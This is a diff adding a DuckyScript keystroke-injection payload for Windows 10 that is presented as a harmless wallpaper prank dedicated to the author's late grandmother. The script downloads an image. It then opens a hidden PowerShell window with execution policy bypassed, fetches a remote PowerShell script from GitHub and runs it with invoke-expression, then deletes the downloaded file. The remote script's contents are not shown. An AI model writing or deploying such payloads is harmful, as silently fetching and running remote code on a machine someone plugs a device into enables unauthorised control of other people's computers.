@@ -1,0 +1,32 @@
+REM Title:         Horsd
+REM Author:        MocconaCoffee
+REM Description:    A simple script that will change the users wallpaper to Brown Horse that is running.
+REM Dedicated to:   This script is a toast to my Nan that passed recently (she loved her horse backgrounds on her 10 year old laptop.) God bless her soul.
+REM Target OS: Windows 10.
+DELAY 3000
+GUI r
+DELAY 300
+STRING powershell
+ENTER
+DELAY 300
+STRING Invoke-WebRequest -Uri https://i.imgur.com/jwstWRR.jpg -OutFile horse.jpg
+ENTER
+DELAY 100
+STRING exit
+ENTER
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/MocconaCoffee/ducky-scripts/master/Horsd/horsd.ps1?dl=1; invoke-expression $pl
+ENTER
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell
+ENTER
+DELAY 300
+STRING Remove-Item horse.jpg
+ENTER
+DELAY 300
+STRING exit
+ENTER
